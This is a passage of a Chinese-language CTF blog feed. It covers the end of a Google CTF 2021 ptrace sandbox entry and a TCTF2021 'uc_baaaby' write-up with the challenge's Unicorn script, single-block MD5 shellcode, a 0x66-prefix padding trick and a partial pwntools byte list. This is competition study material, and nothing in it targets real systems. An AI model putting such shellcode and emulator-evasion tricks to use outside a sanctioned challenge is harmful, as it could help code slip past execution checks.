class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (i &lt; argc - <span class="hljs-number">1</span>) &#123;<br>            chargs[i] = argv[i+<span class="hljs-number">1</span>];<br>            i++;<br>        &#125;<br>        chargs[i] = <span class="hljs-literal">NULL</span>;<br><br>        child = fork();<br>        <span class="hljs-keyword">if</span>(child == <span class="hljs-number">0</span>) &#123;<br>            ptrace(PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>            execvp(chargs[<span class="hljs-number">0</span>], chargs);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s non Virus\n&quot;</span>, argv[<span class="hljs-number">1</span>]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            process_event((<span class="hljs-keyword">void</span> *)child);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>致敬 McAfee</p><img src="/2021/07/19/Google-CTF-2021/image-20210719121945013.png" class="" title="image-20210719121945013">]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
      <tag>Sandbox</tag>
      
      <tag>VM</tag>
      
      <tag>angr</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TCTF2021: uc_master uc_baaby FEA</title>
    <link href="/2021/07/06/TCTF2021-uc-master-uc-baaby-FEA/"/>
    <url>/2021/07/06/TCTF2021-uc-master-uc-baaby-FEA/</url>
    
    <content type="html"><![CDATA[<h1 id="TCTF2021-uc-masteeer-uc-baaaby-FEA"><a href="#TCTF2021-uc-masteeer-uc-baaaby-FEA" class="headerlink" title="TCTF2021: uc_masteeer  uc_baaaby FEA"></a>TCTF2021: uc_masteeer  uc_baaaby FEA</h1><h2 id="uc-baaaby"><a href="#uc-baaaby" class="headerlink" title="uc_baaaby"></a>uc_baaaby</h2><p>题目给出的脚本如下 <a href="/2021/07/06/TCTF2021-uc-master-uc-baaby-FEA/uc_baaaby.zip" title="uc_baaaby.zip">uc_baaaby.zip</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> unicorn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> unicorn.x86_const <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> hashlib<br><br>FLAG = <span class="hljs-string">&#x27;flag&#123;xxxx&#125;&#x27;</span><br>CODE = <span class="hljs-number">0xdeadbeef000</span><br>DATA = <span class="hljs-number">0xbabecafe000</span><br>finished = <span class="hljs-literal">False</span><br>insn_count = <span class="hljs-number">0</span><br>block_count = <span class="hljs-number">0</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hook_block</span>(<span class="hljs-params">uc, address, size, user_data</span>):</span><br>    <span class="hljs-keyword">global</span> block_count<br>    block_count += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> block_count &gt; <span class="hljs-number">1</span>:<br>        print(<span class="hljs-string">&#x27;No cheating!&#x27;</span>)<br>        uc.emu_stop()<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hook_code</span>(<span class="hljs-params">uc, address, size, user_data</span>):</span><br>    <span class="hljs-keyword">global</span> insn_count, finished<br>    insn_count += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> address == CODE + <span class="hljs-number">0x2000</span>:<br>        finished = <span class="hljs-literal">True</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">play</span>():</span><br>    <span class="hljs-keyword">global</span> finished<br>    uc = Uc(UC_ARCH_X86, UC_MODE_64)<br><br>    code = os.read(<span class="hljs-number">0</span>, <span class="hljs-number">0x2000</span>)<br><br>    uc.mem_map(CODE, <span class="hljs-number">0x3000</span>, UC_PROT_READ | UC_PROT_EXEC)<br>    uc.mem_write(CODE, code)<br>    uc.mem_write(CODE + <span class="hljs-number">0x2000</span>, <span class="hljs-string">b&#x27;\xf4&#x27;</span>)<br><br>    check_data = os.urandom(<span class="hljs-number">50</span>)<br>    uc.mem_map(DATA, <span class="hljs-number">0x1000</span>, UC_PROT_READ | UC_PROT_WRITE)<br>    uc.mem_write(DATA, check_data)<br><br>    uc.hook_add(UC_HOOK_CODE, hook_code)<br>    uc.hook_add(UC_HOOK_BLOCK, hook_block)<br><br>    <span class="hljs-keyword">try</span>:<br>        uc.emu_start(CODE, CODE + <span class="hljs-number">0x3000</span>)<br>    <span class="hljs-keyword">except</span> UcError <span class="hljs-keyword">as</span> e:<br>        finished = <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    user_data = uc.mem_read(DATA + <span class="hljs-number">0x800</span>, <span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">if</span> user_data == hashlib.md5(check_data).digest():<br>        print(<span class="hljs-string">&#x27;Nice.&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        print(<span class="hljs-string">&#x27;0ops.&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    print(<span class="hljs-string">&#x27;Welcome to uc_baaaby&#x27;</span>)<br>    win = play()<br>    <span class="hljs-keyword">if</span> finished <span class="hljs-keyword">and</span> win:<br>        print(<span class="hljs-string">&quot;Congratulation! You&#x27;ve reached the end!&quot;</span>)<br>        print(<span class="hljs-string">f&#x27;You took <span class="hljs-subst">&#123;insn_count&#125;</span> seconds.\n&#x27;</span>)<br>        <span class="hljs-keyword">if</span> insn_count &lt; <span class="hljs-number">0x233</span>:<br>            print(<span class="hljs-string">&#x27;How is this possible??? Even Bolt can\&#x27;t run this fast.&#x27;</span>)<br>            print(<span class="hljs-string">&#x27;Prize for you:&#x27;</span>, FLAG)<br>        <span class="hljs-keyword">elif</span> insn_count &lt; <span class="hljs-number">0x300</span>:<br>            print(<span class="hljs-string">&#x27;Come on. You can be faster.&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            print(<span class="hljs-string">&#x27;Gege jia you.&#x27;</span>)<br></code></pre></td></tr></table></figure><p>需要构造 shellcode 计算 check_data 的 MD5 值。 check_data 会被写入到 DATA 地址，shellcode 应该将计算的 MD5 结果 16 字节写入到 DATA + 0x800 地址。</p><p>根据题目代码逻辑得出 shellcode 的限制条件:</p><ol><li>shellcode 指令执行数小于 0x233</li><li>shellcode 只能有一个基本块，不能存在任何跳转（ret也不行）</li><li>shellcode 必须要执行到 0x2000 停止</li></ol><p>12 条件好满足，check_data 的长度固定是 50 字节，只需要计算一个 md5 分组，提前计算 padding 数据，尾加到 check_data 尾部，然后调用 64 个 MD5 计算子过程，最后将结果写入 DATA + 0x800 内存。</p><p>shellcode 如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><code class="hljs asm">.globl md5_compress<br>.globl block1<br>.globl dist<br>md5_compress:<br>#define ROUND0(a, b, c, d, k, s, t)  \<br>movl  %c, %esi;         \<br>addl  (k*4)(%rbp), %a;  \<br>xorl  %d, %esi;         \<br>andl  %b, %esi;         \<br>xorl  %d, %esi;         \<br>leal  t(%esi,%a), %a;   \<br>roll  $s, %a;           \<br>addl  %b, %a;<br><br>#define ROUND1(a, b, c, d, k, s, t)  \<br>movl  %d, %esi;         \<br>movl  %d, %edi;         \<br>addl  (k*4)(%rbp), %a;  \<br>notl  %esi;             \<br>andl  %b, %edi;         \<br>andl  %c, %esi;         \<br>orl   %edi, %esi;       \<br>leal  t(%esi,%a), %a;   \<br>roll  $s, %a;           \<br>addl  %b, %a;<br><br>#define ROUND2(a, b, c, d, k, s, t)  \<br>movl  %c, %esi;         \<br>addl  (k*4)(%rbp), %a;  \<br>xorl  %d, %esi;         \<br>xorl  %b, %esi;         \<br>leal  t(%esi,%a), %a;   \<br>roll  $s, %a;           \<br>addl  %b, %a;<br><br>#define ROUND3(a, b, c, d, k, s, t)  \<br>movl  %d, %esi;         \<br>not   %esi;             \<br>addl  (k*4)(%rbp), %a;  \<br>orl   %b, %esi;         \<br>xorl  %c, %esi;         \<br>leal  t(%esi,%a), %a;   \<br>roll  $s, %a;           \<br>addl  %b, %a;<br><br><br>movq  $block1, %rbp<br>    nop<br>    nop<br>    nop<br>    nop<br>    movl $0x67452301, %eax<br>    movl $0xefcdab89, %ebx<br>    movl $0x98badcfe, %ecx<br>    movl $0x10325476, %edx<br>    &#x2F;* pading data *&#x2F;<br>    movl $0x80, 0x32(%rbp)<br>    movl $0x1900000, 0x36(%rbp)<br>    movq $0x0, 0x3a(%rbp)<br><br><br>ROUND0(eax, ebx, ecx, edx,  0,  7, -0x28955B88)<br>ROUND0(edx, eax, ebx, ecx,  1, 12, -0x173848AA)<br>ROUND0(ecx, edx, eax, ebx,  2, 17,  0x242070DB)<br>ROUND0(ebx, ecx, edx, eax,  3, 22, -0x3E423112)<br>ROUND0(eax, ebx, ecx, edx,  4,  7, -0x0A83F051)<br>ROUND0(edx, eax, ebx, ecx,  5, 12,  0x4787C62A)<br>ROUND0(ecx, edx, eax, ebx,  6, 17, -0x57CFB9ED)<br>ROUND0(ebx, ecx, edx, eax,  7, 22, -0x02B96AFF)<br>ROUND0(eax, ebx, ecx, edx,  8,  7,  0x698098D8)<br>ROUND0(edx, eax, ebx, ecx,  9, 12, -0x74BB0851)<br>ROUND0(ecx, edx, eax, ebx, 10, 17, -0x0000A44F)<br>ROUND0(ebx, ecx, edx, eax, 11, 22, -0x76A32842)<br>ROUND0(eax, ebx, ecx, edx, 12,  7,  0x6B901122)<br>ROUND0(edx, eax, ebx, ecx, 13, 12, -0x02678E6D)<br>ROUND0(ecx, edx, eax, ebx, 14, 17, -0x5986BC72)<br>ROUND0(ebx, ecx, edx, eax, 15, 22,  0x49B40821)<br>ROUND1(eax, ebx, ecx, edx,  1,  5, -0x09E1DA9E)<br>ROUND1(edx, eax, ebx, ecx,  6,  9, -0x3FBF4CC0)<br>ROUND1(ecx, edx, eax, ebx, 11, 14,  0x265E5A51)<br>ROUND1(ebx, ecx, edx, eax,  0, 20, -0x16493856)<br>ROUND1(eax, ebx, ecx, edx,  5,  5, -0x29D0EFA3)<br>ROUND1(edx, eax, ebx, ecx, 10,  9,  0x02441453)<br>ROUND1(ecx, edx, eax, ebx, 15, 14, -0x275E197F)<br>ROUND1(ebx, ecx, edx, eax,  4, 20, -0x182C0438)<br>ROUND1(eax, ebx, ecx, edx,  9,  5,  0x21E1CDE6)<br>ROUND1(edx, eax, ebx, ecx, 14,  9, -0x3CC8F82A)<br>ROUND1(ecx, edx, eax, ebx,  3, 14, -0x0B2AF279)<br>ROUND1(ebx, ecx, edx, eax,  8, 20,  0x455A14ED)<br>ROUND1(eax, ebx, ecx, edx, 13,  5, -0x561C16FB)<br>ROUND1(edx, eax, ebx, ecx,  2,  9, -0x03105C08)<br>ROUND1(ecx, edx, eax, ebx,  7, 14,  0x676F02D9)<br>ROUND1(ebx, ecx, edx, eax, 12, 20, -0x72D5B376)<br>ROUND2(eax, ebx, ecx, edx,  5,  4, -0x0005C6BE)<br>ROUND2(edx, eax, ebx, ecx,  8, 11, -0x788E097F)<br>ROUND2(ecx, edx, eax, ebx, 11, 16,  0x6D9D6122)<br>ROUND2(ebx, ecx, edx, eax, 14, 23, -0x021AC7F4)<br>ROUND2(eax, ebx, ecx, edx,  1,  4, -0x5B4115BC)<br>ROUND2(edx, eax, ebx, ecx,  4, 11,  0x4BDECFA9)<br>ROUND2(ecx, edx, eax, ebx,  7, 16, -0x0944B4A0)<br>ROUND2(ebx, ecx, edx, eax, 10, 23, -0x41404390)<br>ROUND2(eax, ebx, ecx, edx, 13,  4,  0x289B7EC6)<br>ROUND2(edx, eax, ebx, ecx,  0, 11, -0x155ED806)<br>ROUND2(ecx, edx, eax, ebx,  3, 16, -0x2B10CF7B)<br>ROUND2(ebx, ecx, edx, eax,  6, 23,  0x04881D05)<br>ROUND2(eax, ebx, ecx, edx,  9,  4, -0x262B2FC7)<br>ROUND2(edx, eax, ebx, ecx, 12, 11, -0x1924661B)<br>ROUND2(ecx, edx, eax, ebx, 15, 16,  0x1FA27CF8)<br>ROUND2(ebx, ecx, edx, eax,  2, 23, -0x3B53A99B)<br>ROUND3(eax, ebx, ecx, edx,  0,  6, -0x0BD6DDBC)<br>ROUND3(edx, eax, ebx, ecx,  7, 10,  0x432AFF97)<br>ROUND3(ecx, edx, eax, ebx, 14, 15, -0x546BDC59)<br>ROUND3(ebx, ecx, edx, eax,  5, 21, -0x036C5FC7)<br>ROUND3(eax, ebx, ecx, edx, 12,  6,  0x655B59C3)<br>ROUND3(edx, eax, ebx, ecx,  3, 10, -0x70F3336E)<br>ROUND3(ecx, edx, eax, ebx, 10, 15, -0x00100B83)<br>ROUND3(ebx, ecx, edx, eax,  1, 21, -0x7A7BA22F)<br>ROUND3(eax, ebx, ecx, edx,  8,  6,  0x6FA87E4F)<br>ROUND3(edx, eax, ebx, ecx, 15, 10, -0x01D31920)<br>ROUND3(ecx, edx, eax, ebx,  6, 15, -0x5CFEBCEC)<br>ROUND3(ebx, ecx, edx, eax, 13, 21,  0x4E0811A1)<br>ROUND3(eax, ebx, ecx, edx,  4,  6, -0x08AC817E)<br>ROUND3(edx, eax, ebx, ecx, 11, 10, -0x42C50DCB)<br>ROUND3(ecx, edx, eax, ebx,  2, 15,  0x2AD7D2BB)<br>ROUND3(ebx, ecx, edx, eax,  9, 21, -0x14792C6F)<br><br>&#x2F;* Save updated state *&#x2F;<br>    addl $0x67452301, %eax<br>    addl $0xefcdab89, %ebx<br>    addl $0x98badcfe, %ecx<br>    addl $0x10325476, %edx<br>    movq  $dist, %r8<br>    nop<br>    nop<br>    nop<br>    nop<br>    movl %eax, 0(%r8)<br>    movl %ebx, 4(%r8)<br>    movl %ecx, 8(%r8)<br>    movl %edx, 12(%r8)<br></code></pre></td></tr></table></figure><p>编译后， shellcode 中 block1  patch 为 DATA 地址， dist patch 为 DATA + 0x800 地址。</p><p>上面构造的 shellcode 的指令执行数量满足要求，但是不满足条件3，条件3要求指令执行结束的地址必须 0x2000，然而该 shellcode 的字节长度远远够不到 0x2000。</p><p>添加指令前缀 0x66 可以改变单条指令的大小，却不影响指令数量，而且好像可以无限添加。在第一条指令前添加 0x66 对齐到0x2000字节</p><p>最终 exp 如下</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">from pwn import *<br>code = [<span class="hljs-number">0x48</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xAF</span>, <span 